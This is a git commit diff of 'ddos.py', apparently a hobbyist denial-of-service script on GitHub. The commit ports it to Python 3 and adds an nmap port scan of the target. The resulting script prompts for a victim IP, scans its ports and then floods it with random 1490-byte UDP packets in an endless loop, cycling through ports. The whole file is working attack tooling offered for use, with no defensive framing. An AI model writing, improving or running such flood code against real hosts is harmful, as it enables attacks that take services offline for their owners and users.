8706e04843a64442c0d7181927e35bd6b5a432ae
CxllZ <72345758+CxllZ@users.noreply.github.com>
2021-02-06 13:49:59 +0000

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,8 +1,10 @@
 import sys
 import os
+import nmap
 import time
 import socket
 import random
+
 #Code Time
 from datetime import datetime
 now = datetime.now()
@@ -17,35 +19,56 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 
-os.system("clear,cls")
+os.system("clear")
+os.system("cls")
 os.system("figlet DDos Attack")
 print
-print "Author   : CxllZ"
-print "Socials  : https://bit.ly/2Er2Sni"
-print
-ip = raw_input("IP Target : ")
+print ("Author   : CxllZ")
+print ("Socials  : https://bit.ly/2Er2Sni")
+print ()
+ip = input ("IP Target : ")
+print ("nmap is scanning ip for open ports please wait a few seconds")
+print ()
 
-nmap (ip) 
+#nmap port scanner so they know what ports to use
+nm = nmap.PortScanner()
+nm.scan(ip, '0-1024')
+for host in nm.all_hosts():
+    print('----------------------------------------------------')
+    print('Host : {} ({})'.format(ip, nm[ip].hostname()))
+    print('State : {}'.format(nm[ip].state()))
+    for proto in nm[ip].all_protocols():
+        print('----------')
+        print('Protocol : {}'.format(proto))
+ 
+        lport = nm[ip][proto].keys()
+        for port in lport:
+            print ('port : {}\tstate : {}'.format(port, nm[ip][proto][port]['state']))
 
-port = input("Port       : ")
+print ()
+print ("no results or says 'host down' but you know its online? just use port 80")
+print ()
+port = input ("Port : ")
 
-os.system("clear,cls")
+os.system("cls")
+os.system("clear")
 os.system("figlet Attack Starting")
-print "[                    ] 0% "
+print ("[                    ] 0% ")
 time.sleep(1)
-print "[=====               ] 25%"
+print ("[=====               ] 25%")
 time.sleep(1)
-print "[==========          ] 50%"
+print ("[==========          ] 50%")
 time.sleep(1)
-print "[===============     ] 75%"
+print ("[===============     ] 75%")
 time.sleep(1)
-print "[====================] 100%"
-time.sleep(1)
+print ("[====================] 100%")
+time.sleep(2)
 sent = 0
+
 while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     sock.sendto(bytes, (ip, int(port)))
+     sent = int(sent) + 1
+     port = int(port) + 1
+     print ("Sent %s packets to %s throught port:%s"%(sent,ip,port))
      if port == 65534:
        port = 1
